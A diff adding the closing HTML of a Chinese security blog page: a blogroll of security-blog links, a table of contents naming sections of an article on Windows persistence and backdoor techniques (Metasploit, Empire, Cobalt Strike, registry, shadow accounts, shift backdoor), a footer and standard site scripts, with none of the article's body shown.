+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#工具篇"><span class="nav-number">1.</span> <span class="nav-text">工具篇</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">2.</span> <span class="nav-text">msf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Persistence模块"><span class="nav-number">2.1.</span> <span class="nav-text">Persistence模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metsvc-模块"><span class="nav-number">2.2.</span> <span class="nav-text">Metsvc 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Scheduleme-amp-Schtasksabus"><span class="nav-number">2.3.</span> <span class="nav-text">Scheduleme &amp; Schtasksabus</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Empire"><span class="nav-number">3.</span> <span class="nav-text">Empire</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#计划任务"><span class="nav-number">3.1.</span> <span class="nav-text">计划任务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobalt-Strike"><span class="nav-number">4.</span> <span class="nav-text">Cobalt Strike</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表："><span class="nav-number">4.1.</span> <span class="nav-text">注册表：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#技术篇"><span class="nav-number">5.</span> <span class="nav-text">技术篇</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表类："><span class="nav-number">6.</span> <span class="nav-text">注册表类：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通注册表后门"><span class="nav-number">6.1.</span> <span class="nav-text">普通注册表后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Winlogon-Helper-DLL后门"><span class="nav-number">6.2.</span> <span class="nav-text">Winlogon Helper DLL后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Logon-Scripts后门"><span class="nav-number">6.3.</span> <span class="nav-text">Logon Scripts后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表之CLR"><span class="nav-number">6.4.</span> <span class="nav-text">注册表之CLR</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内部工具类"><span class="nav-number">7.</span> <span class="nav-text">内部工具类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#waitfor-exe"><span class="nav-number">7.1.</span> <span class="nav-text">waitfor.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bitsadmin"><span class="nav-number">7.2.</span> <span class="nav-text">bitsadmin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msdtc加载后门"><span class="nav-number">7.3.</span> <span class="nav-text">msdtc加载后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmi执行后门技术"><span class="nav-number">7.4.</span> <span class="nav-text">wmi执行后门技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计划任务-1"><span class="nav-number">7.5.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinRM服务后门"><span class="nav-number">7.6.</span> <span class="nav-text">WinRM服务后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改系统服务"><span class="nav-number">7.7.</span> <span class="nav-text">修改系统服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dll劫持"><span class="nav-number">7.8.</span> <span class="nav-text">dll劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程登录类"><span class="nav-number">8.</span> <span class="nav-text">远程登录类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#影子账户、克隆账户、激活guest"><span class="nav-number">8.1.</span> <span class="nav-text">影子账户、克隆账户、激活guest</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rid-hijack"><span class="nav-number">8.2.</span> <span class="nav-text">rid_hijack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shift后门"><span class="nav-number">8.3.</span> <span class="nav-text">shift后门</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
